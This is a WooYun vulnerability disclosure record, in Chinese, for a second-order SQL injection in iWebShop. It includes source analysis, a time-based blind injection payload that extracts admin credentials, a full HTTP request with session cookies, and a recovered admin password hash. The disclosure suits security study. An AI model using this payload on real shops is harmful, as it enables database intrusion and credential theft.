{"id": 39772, "wybug_id": "wooyun-2015-093276", "wybug_title": "Iwebshop最新版二次注入一枚", "wybug_corp": "Jooyea", "wybug_author": "路人甲", "wybug_date": "2015-01-27 11:22", "wybug_open_date": "2015-04-27 11:24", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码审核", "源码分析", "白盒测试"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-01-27：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2015-04-27：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： Iwebshop最新版二次注入一枚 详细说明：  看到wooyun上有人提了几个iweshop（2014-11-18更新）的漏洞（ WooYun: iWebShop开源电子商务系统SQL注入漏洞 ），去官网看了看，在2014-12-16 已更新到了 iwebshop2.9.14121000，下下来研究研究，希望不要重复。写入Payload的点：POST /index.php?controller=seller&action=goods_update  POST参数中的img触发注入的点：POST /index.php?controller=seller&action=regiment_edit_act看看Payload是如何写入的/controllers/seller.php\n//商品更新动作\tpublic function goods_update()\t{\t\t$id       = IFilter::act(IReq::get('id'),'int');\t\t$callback = IFilter::act(IReq::get('callback'),'url');\t\t$callback = strpos($callback,'seller/goods_list') === false ? '' : $callback;\t\t//检查表单提交状态\t\tif(!$_POST)\t\t{\t\t\tdie('请确认表单提交正确');\t\t}\t\t//初始化商品数据\t\tunset($_POST['id']);\t\tunset($_POST['callback']);\t\t$goodsObject = new goods_class($this->seller['seller_id']);\t\t$goodsObject->update($id,$_POST);\t\t$callback ? $this->redirect($callback) : $this->redirect(\"goods_list\");\t}\n去看看update是如何把Payload写入的\npublic function update($id,$paramData)\t{\t\t$postData = array();\t\t$nowDataTime = ITime::getDateTime();\t\tforeach($paramData as $key => $val)\t\t{\t\t\t$postData[$key] = $val;\t\t\t//数据过滤分组\t\t\tif(strpos($key,'attr_id_') !== false)\t\t\t{\t\t\t\t$goodsAttrData[ltrim($key,'attr_id_')] = IFilter::act($val);\t\t\t}\t\t\telse if($key[0] != '_')\t\t\t{\t\t\t\t$goodsUpdateData[$key] = IFilter::act($val,'text');\t\t\t}\t\t}无关代码\n再去看看IFilter::act/lib/core/util/filter_class.php\npublic static function act($str,$type = 'string',$limitLen = false)\t{\t\tif(is_array($str))\t\t{\t\t\tforeach($str as $key => $val)\t\t\t{\t\t\t\t$resultStr[$key] = self::act($val, $type, $limitLen);\t\t\t}\t\t\treturn $resultStr;\t\t}\t\telse\t\t{\t\t\tswitch($type)\t\t\t{\t\t\t\tcase \"int\":\t\t\t\t\treturn intval($str);\t\t\t\t\tbreak;\t\t\t\tcase \"float\":\t\t\t\t\treturn floatval($str);\t\t\t\t\tbreak;\t\t\t\tcase \"text\":\t\t\t\t\treturn self::text($str,$limitLen);\t\t\t\t\tbreak;\t\t\t\tcase \"bool\":\t\t\t\t\treturn (bool)$str;\t\t\t\t\tbreak;\t\t\t\tcase \"url\":\t\t\t\t\treturn self::clearUrl($str);\t\t\t\t\tbreak;\t\t\t\tcase \"filename\":\t\t\t\t\treturn self::fileName($str);\t\t\t\t\tbreak;\t\t\t\tdefault:\t\t\t\t\treturn self::string($str,$limitLen);\t\t\t\t\tbreak;\t\t\t}\t\t}\t}\n当输入的参数名不包含attr_id_或者不以_开头，则执行IFilter::act($val,'text')；对用户的输入进行了addslashes处理，然后就写入了数据库，我们都知道\\’在入库时，\\是会被去掉的，所以，单引号被写入了数据库。如下图\n\n关键问题是被写入的单引号在哪个地方被读出然后再入库，在这个地方找到了/controllers/seller.php\n//[团购]添加修改[动作]\tfunction regiment_edit_act()\t{\t\t$id      = IFilter::act(IReq::get('id'),'int');\t\t$goodsId = IFilter::act(IReq::get('goods_id'),'int');\t\t$dataArray = array(\t\t\t'id'        \t=> $id,\t\t\t'title'     \t=> IFilter::act(IReq::get('title','post')),\t\t\t'start_time'\t=> IFilter::act(IReq::get('start_time','post')),\t\t\t'end_time'  \t=> IFilter::act(IReq::get('end_time','post')),\t\t\t'is_close'      => 1,\t\t\t'intro'     \t=> IFilter::act(IReq::get('intro','post')),\t\t\t'goods_id'      => $goodsId,\t\t\t'store_nums'    => IFilter::act(IReq::get('store_nums','post')),\t\t\t'least_count'   => IFilter::act(IReq::get('least_count','post')),\t\t\t'regiment_price'=> IFilter::act(IReq::get('regiment_price','post')),\t\t);\t\tif($goodsId)\t\t{\t\t\t$goodsObj = new IModel('goods');\t\t\t$where    = 'id = '.$goodsId.' and seller_id = '.$this->seller['seller_id'];\t\t\t$goodsRow = $goodsObj->getObj($where); //出库啦\t\t\t//商品信息不存在\t\t\tif(!$goodsRow)\t\t\t{\t\t\t\t$this->regimentRow = $dataArray;\t\t\t\t$this->redirect('regiment_edit',false);\t\t\t\tUtil::showMessage('请选择商户自己的商品');\t\t\t}\t\t\t//处理上传图片\t\t\tif(isset($_FILES['img']['name']) && $_FILES['img']['name'] != '')\t\t\t{\t\t\t\t$uploadObj = new PhotoUpload();\t\t\t\t$photoInfo = $uploadObj->run();\t\t\t\t$dataArray['img'] = $photoInfo['img']['img'];\t\t\t}\t\t\telse\t\t\t{\t\t\t\t$dataArray['img'] = $goodsRow['img'];\t//把img写入了$dataArray['img']，而$dataArray下面会入库\t\t\t\t\t\t}\t\t\t\t\t$dataArray['sell_price'] = $goodsRow['sell_price'];\t\t}\t\telse\t\t{\t\t\t$this->regimentRow = $dataArray;\t\t\t$this->redirect('regiment_edit',false);\t\t\tUtil::showMessage('请选择要关联的商品');\t\t}\t\t\t$regimentObj = new IModel('regiment');\t\t$regimentObj->setData($dataArray);\t\tif($id)\t\t{\t\t\t$where = 'id = '.$id;\t\t\t$regimentObj->update($where); //入库啦\t\t}\t\telse\t\t{\t\t\t$regimentObj->add();\t\t}\t\t\t$this->redirect('regiment_list');\t\t\t}\n请看上面代码中的注释，说明了出库再入库的整个过程。测试方法：申请开店后，登录，发布一个商品，因为第一次发布产品其id为1，而每发一个产品id自动加1，在触发漏洞时的参数goods_id即为这里的id，每次加1即可（写脚本跑也方便了），漏洞会在添加修改团购时触发。写入Payload时的payload:POST提交\nid=&img=' or(select if(ord(mid((select admin_name from iwebshop_admin limit 0,1),1,1))=97,sleep(1),0))or'&_imgList=&callback=%2Fseller%2Findex&name=a&search_words=a&sort=99&unit=a&_goods_no%5B0%5D=SD142184781210&_store_nums%5B0%5D=100&_market_price%5B0%5D=123&_sell_price%5B0%5D=234&_cost_price%5B0%5D=345&_weight%5B0%5D=123&model_id=0&brand_id=0&is_del=3&content=&keywords=&description=\n触发漏洞时的部分payload:post提交\nPOST /index.php?controller=seller&action=regiment_edit_act HTTP/1.1Host: 192.168.0.107User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:35.0) Gecko/20100101 Firefox/35.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh,zh-cn;q=0.8,en-us;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateReferer: http://192.168.0.107/index.php?controller=seller&action=regiment_edit&id=1Cookie: AJSTAT_ok_times=8; bdshare_firstime=1414502402741; ypsdffp2app_admininfo=3ea11oJSSGDzcgLaKJDrFiEPRQYqj%2Blp5mLLe86ouSLzMcMMel8RqXt%2BcZaONpt0jYKtml%2FsZqrOv32i8lriIBjKBlTBDmbz6JsxAIZYnUnYVJQ; iweb_safecode=480691d9d1OTA2OTUwMDQxMzI4YjU0ZWw2NTBiMjNlMD9nZTA1MDc; iweb_seller_id=658d8a2adfMDMxNzIwMDA5MjBiNzU9MzhiYDJsNzA1OTs2YWFkZmMx; iweb_seller_name=658d8a2adfMDMxNzIwMDA5MjEzYWZoZzY8YDU8MTEyMWA1ZjRiMjZwaGdzZnN3; iweb_seller_pwd=480691d9d1OTA2OTUwMDQxMzc1MGQ7Oj9hYzUzOGMyYWg3MmBmZGRjNTA5YWFjMTA4NDM5MjE9ZTQ0YzZhMmk7MDpjMTBhNg; iweb_shoppingcart=daab27438eMDAwODI0MDA3ODcwY2JlMGZkZzE4YjAzZDw1MzA8Mz57JmFpb2NxLjlbXSIleXtsZ3VidCY6W15%2F; iweb_user_id=50efcc9726NjAzMDA5MDUwNDcxYzQ2b2YzNTBpMzBlOTZhZjUyOT8; iweb_username=50efcc9726NjAzMDA5MDUwNDcxYzQ2b2YzNTBpMzBlOTZhZjUyOT8; iweb_head_ico=50efcc9726NjAzMDA5MDUwNDcxYzQ2b2YzNTBpMzBlOTZhZjUyOT8; iweb_user_pwd=cfe17d7df9MDAwODIwMDA1MzI6ZDQ2YGU2NjFiOzBlMDZqbzQyOTY; iweb_visit=fe1f056e18MjAwOTAwMjE4MzZkMGY1MGZlZjg1YTlgZDdqPWQ0MTMlNyM; ipAddress=%E5%9B%9B%E5%B7%9D; iweb_captcha=85205ae681MDQ2MDQ1NTIwNTEwYWU2YWo4ZWc1YjJkYz1hbDI3PDJjYnFjZgConnection: keep-aliveContent-Type: multipart/form-data; boundary=---------------------------288682924126107Content-Length: 1138-----------------------------288682924126107Content-Disposition: form-data; name=\"id\"1-----------------------------288682924126107Content-Disposition: form-data; name=\"goods_id\"12\n因为是time-based blind 注入，猜测管理员用户名的第一个字母时，若错误，延迟2s左右，如下图\n\n若正确，延迟3s左右（和数据库中的记录有关）如下图\n\n按上面的方法依次做下去（burp intruder或者自己写个脚本跑），可测试管理员用户名为：admin，密码为： f6fdffe48c908deb0f4c3bd36c032e72   漏洞证明：  见 详细说明   修复方案：  过滤   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}